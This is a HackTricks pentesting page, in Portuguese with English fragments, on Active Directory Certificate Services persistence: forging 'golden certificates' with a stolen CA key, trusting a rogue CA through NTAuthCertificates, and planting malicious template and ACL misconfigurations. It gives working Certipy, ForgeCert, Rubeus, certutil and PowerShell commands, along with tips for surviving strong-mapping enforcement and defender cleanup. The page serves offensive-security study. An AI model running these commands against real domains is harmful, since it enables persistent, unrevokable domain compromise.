# Persistência de Domínio AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Este é um resumo das técnicas de persistência de domínio compartilhadas em [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulte-o para mais detalhes.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Como saber se um certificado é um certificado CA?

É possível determinar que um certificado é um certificado CA se várias condições forem atendidas:

- O certificado está armazenado no servidor CA, com sua chave privada protegida pelo DPAPI da máquina, ou por hardware como TPM/HSM se o sistema operacional suportar.
- Os campos Issuer e Subject do certificado correspondem ao nome distinto (distinguished name) da CA.
- Uma extensão "CA Version" está presente exclusivamente nos certificados CA.
- O certificado não possui campos Extended Key Usage (EKU).

Para extrair a chave privada deste certificado, a ferramenta `certsrv.msc` no servidor CA é o método suportado via GUI integrada. No entanto, este certificado não difere dos outros armazenados no sistema; portanto, métodos como a [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) podem ser aplicados para extração.

O certificado e a chave privada também podem ser obtidos usando Certipy com o seguinte comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Ao obter o certificado da CA e sua chave privada no formato `.pfx`, ferramentas como [ForgeCert](https://github.com/GhostPack/ForgeCert) podem ser utilizadas para gerar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> O usuário alvo da falsificação de certificado deve estar ativo e capaz de autenticar-se no Active Directory para que o processo tenha sucesso. Forjar um certificado para contas especiais como krbtgt é ineficaz.

Este certificado forjado será **válido** até a data de término especificada e enquanto o certificado root CA estiver válido (normalmente de 5 a **10+ anos**). Também é válido para **máquinas**, então combinado com **S4U2Self**, um atacante pode **manter persistência em qualquer máquina do domínio** enquanto o certificado da CA estiver válido.\
Além disso, os **certificados gerados** com este método **não podem ser revogados**, pois a CA não tem conhecimento deles.

### Operando sob Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- Conter um vínculo forte com a conta alvo (por exemplo, a extensão de segurança SID), ou
- Serem pareados com um mapeamento explícito e forte no atributo `altSecurityIdentities` do objeto alvo.

Uma abordagem confiável para persistência é emitir um certificado forjado encadeado à Enterprise CA roubada e então adicionar um mapeamento explícito e forte ao principal da vítima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Se você puder criar certificados forjados que incluam a extensão de segurança SID, eles serão mapeados implicitamente mesmo sob Full Enforcement. Caso contrário, prefira mapeamentos explícitos e fortes. Veja
[account-persistence](account-persistence.md) para mais sobre mapeamentos explícitos.
- Revogação não ajuda os defensores aqui: certificados forjados são desconhecidos do banco de dados da CA e, portanto, não podem ser revogados.

## Confiando em Certificados CA Maliciosos - DPERSIST2

O objeto `NTAuthCertificates` é definido para conter um ou mais **certificados CA** dentro do seu atributo `cacertificate`, que o Active Directory (AD) utiliza. O processo de verificação pelo **domain controller** envolve checar o objeto `NTAuthCertificates` em busca de uma entrada que corresponda à **CA especificada** no campo Issuer do **certificado** que está se autenticando. A autenticação prossegue se for encontrada uma correspondência.

Um certificado CA autoassinado pode ser adicionado ao objeto `NTAuthCertificates` por um atacante, desde que ele tenha controle sobre esse objeto do AD. Normalmente, apenas membros do grupo **Enterprise Admin**, juntamente com **Domain Admins** ou **Administrators** no **forest root’s domain**, têm permissão para modificar esse objeto. Eles podem editar o objeto `NTAuthCertificates` usando `certutil.exe` com o comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou empregando o [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionais úteis para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Essa capacidade é especialmente relevante quando usada em conjunto com um método descrito anteriormente envolvendo o ForgeCert para gerar certificados dinamicamente.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Existem muitas oportunidades para **persistence** através de modificações de descritores de segurança em componentes do AD CS. Modificações descritas na seção "[Domain Escalation](domain-escalation.md)" podem ser implementadas maliciosamente por um atacante com acesso elevado. Isso inclui a adição de direitos de controle (por exemplo, WriteOwner/WriteDACL/etc.) a componentes sensíveis tais como:

- O objeto de computador AD do **servidor CA**
- O **servidor RPC/DCOM do servidor CA**
- Qualquer **objeto AD descendente ou contêiner** em **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por exemplo, o contêiner Certificate Templates, o contêiner Certification Authorities, o objeto NTAuthCertificates, etc.)
- **Grupos AD delegados com direitos para controlar o AD CS** por padrão ou pela organização (como o grupo integrado Cert Publishers e quaisquer de seus membros)

Um exemplo de implementação maliciosa envolveria um atacante, que possui **elevated permissions** no domínio, adicionando a permissão **`WriteOwner`** ao template de certificado padrão **`User`**, com o atacante sendo o principal para esse direito. Para explorar isso, o atacante primeiro mudaria a propriedade do template **`User`** para si mesmo. Em seguida, o **`mspki-certificate-name-flag`** seria definido como **1** no template para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitindo que um usuário forneça um Subject Alternative Name na requisição. Posteriormente, o atacante poderia **enroll** usando o **template**, escolhendo um nome de **domain administrator** como nome alternativo, e utilizar o certificado adquirido para autenticação como DA.

Ajustes práticos que atacantes podem configurar para persistence de longo prazo no domínio (veja {{#ref}}domain-escalation.md{{#endref}} para detalhes completos e detecção):

- Flags de política da CA que permitem SAN a partir dos solicitantes (por exemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Isso mantém caminhos do tipo ESC1 exploráveis.
- DACL do template ou configurações que permitam emissão com capacidade de autenticação (por exemplo, adicionar EKU Client Authentication, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar o objeto `NTAuthCertificates` ou os containers da CA para reintroduzir continuamente emissores rogue caso os defensores tentem limpar.

> [!TIP]
> Em ambientes endurecidos após KB5014754, combinar essas más configurações com mapeamentos explícitos e fortes (`altSecurityIdentities`) garante que seus certificados emitidos ou forjados permaneçam utilizáveis mesmo quando os DCs aplicarem mapeamento forte.



## Referências

- Microsoft KB5014754 – Alterações na autenticação baseada em certificado nos Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
